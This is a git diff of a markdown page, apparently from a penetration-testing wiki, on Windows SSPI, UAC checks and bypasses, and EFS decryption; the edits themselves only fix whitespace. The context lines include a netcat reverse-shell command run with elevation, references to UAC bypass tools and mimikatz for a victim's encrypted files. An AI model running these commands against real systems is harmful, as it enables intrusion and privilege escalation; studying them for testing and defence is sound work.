@@ -17,7 +17,7 @@ The SSPI will be in charge of finding the adequate protocol for two machines tha
 * **Schannel**: SSL and TLS 
   * %windir%\Windows\System32\Schannel.dll
 * **Negotiate**: It is used to negotiate the protocol to use \(Kerberos or NTLM being Kerberos the default one\) 
-  *  %windir%\Windows\System32\lsasrv.dll
+  * %windir%\Windows\System32\lsasrv.dll
 
 #### The negotiation could offer several methods or only one.
 
@@ -75,7 +75,7 @@ You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe*
 First you need to check the value of the key **EnableLUA**, if it's **`1`** then UAC is **activated**, if its **`0`** or it **doesn't exist**, then UAC is **inactive**.
 
 ```text
- reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ 
+ reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\
 ```
 
 Then you have to check the value of the key **`ConsentPromptBehaviorAdmin`**in the same entry of the registry as before \(info from [here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4)\):
@@ -87,7 +87,7 @@ Then you have to check the value of the key **`ConsentPromptBehaviorAdmin`**in t
 * If **`4`** like `2` but not necessary on Secure Desktop
 * if **`5`**\(**default**\) it will ask the administrator to confirm to run non Windows binaries with high privileges
 
-Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**   
+Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**  
 If the value is **`0`**, then, only the **RID 500** user \(**built-in Administrator**\) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.
 
 And, finally take a look at the value of the key **`FilterAdministratorToken`**  
@@ -149,7 +149,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 You could also use some tools to **bypass UAC like** [**UACME** ](https://github.com/hfiref0x/UACME)which is a **compilation** of several UAC bypass exploits. Note that you will need to **compile UACME using visual studio or msbuild**. The compilation will create several executables \(like_Source\Akagi\outout\x64\Debug\Akagi.exe_\) , you will need to know **which one you need.**  
 You should **be careful** because some bypasses will **prompt some other programs** that will **alert** the **user** that something is happening.
 
-**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**. 
+**Empire** and **Metasploit** also have several modules to **bypass** the **UAC**.
 
 #### More UAC bypass
 
@@ -178,9 +178,9 @@ Consists on watching if an **autoElevated binary** tries to **read** from the **
 
 ## EFS \(Encrypted File System\)
 
-EFS works by encrypting a file with a bulk **symmetric key**, also known as the File Encryption Key, or **FEK**.  The FEK is then **encrypted** with a **public key** that is associated with the user who encrypted the file, and this encrypted FEK is stored in the $EFS **alternative data stream** of the encrypted file. To decrypt the file, the EFS component driver uses the **private key** that matches the EFS digital certificate \(used to encrypt the file\) to decrypt the symmetric key that is stored in the $EFS stream. From [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
+EFS works by encrypting a file with a bulk **symmetric key**, also known as the File Encryption Key, or **FEK**. The FEK is then **encrypted** with a **public key** that is associated with the user who encrypted the file, and this encrypted FEK is stored in the $EFS **alternative data stream** of the encrypted file. To decrypt the file, the EFS component driver uses the **private key** that matches the EFS digital certificate \(used to encrypt the file\) to decrypt the symmetric key that is stored in the $EFS stream. From [here](https://en.wikipedia.org/wiki/Encrypting_File_System).
 
-Examples of files being decrypted without the user asking for it: 
+Examples of files being decrypted without the user asking for it:
 
 * Files and folders are decrypted before being copied to a volume formatted with another file system, like [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table). 
 * Encrypted files are copied over the network using the SMB/CIFS protocol, the files are decrypted before they are sent over the network.
@@ -194,7 +194,7 @@ Check if a **user** has **used** this **service** checking if this path exists:`
 Check **who** has **access** to the file using cipher /c &lt;file&gt;  
 You can also use `cipher /e` and `cipher /d` inside a folder to **encrypt** and **decrypt** all the files
 
-### Decrypting EFS files 
+### Decrypting EFS files
 
 #### Being Authority System
 
@@ -202,7 +202,5 @@ This way requires the **victim user** to be **running** a **process** inside the
 
 #### Knowing the users password
 
-{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}
-
-
+{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" caption="" %}
 
